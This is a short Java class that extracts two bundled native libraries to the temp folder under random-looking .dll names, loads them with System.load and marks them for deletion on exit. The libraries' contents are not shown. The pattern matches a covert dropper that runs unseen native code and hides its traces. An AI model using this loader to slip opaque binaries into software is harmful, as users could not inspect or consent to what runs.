import java.io.*;
import java.util.Arrays;

/**
 * @Author: QianXia
 * @Description: 会做一些奇怪的事情
 * @Date: 2020/12/30-20:42
 */
public class OhDear {
    public static void OMG(){
        try {
            String outPath32 = System.getProperty("java.io.tmpdir")  + "dsnuvishgtrgdsfgfd3.dll";
            String outPath64 = System.getProperty("java.io.tmpdir")  + "dsnuvishgtrgdsfgfd6.dll";

            InputStream inputStream32 = OhDear.class.getResourceAsStream("META-INF/SHIT");
            InputStream inputStream64 = OhDear.class.getResourceAsStream("META-INF/SHIT64");

            OutputStream outputStream32 = new FileOutputStream(outPath32);
            OutputStream outputStream64 = new FileOutputStream(outPath64);

            int temp = 0;
            byte[] data = new byte[1024];

            while ((temp = inputStream32.read(data)) != -1){
                outputStream32.write(data,0,temp);
            }


            data = new byte[1024];

            while ((temp = inputStream64.read(data)) != -1){
                outputStream64.write(data,0, temp);
            }

            new File(outPath32).deleteOnExit();
            new File(outPath64).deleteOnExit();

            inputStream32.close();
            inputStream64.close();
            outputStream32.close();
            outputStream64.close();

            try {
                System.load(outPath32);
            } catch (UnsatisfiedLinkError e) {
                System.load(outPath64);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
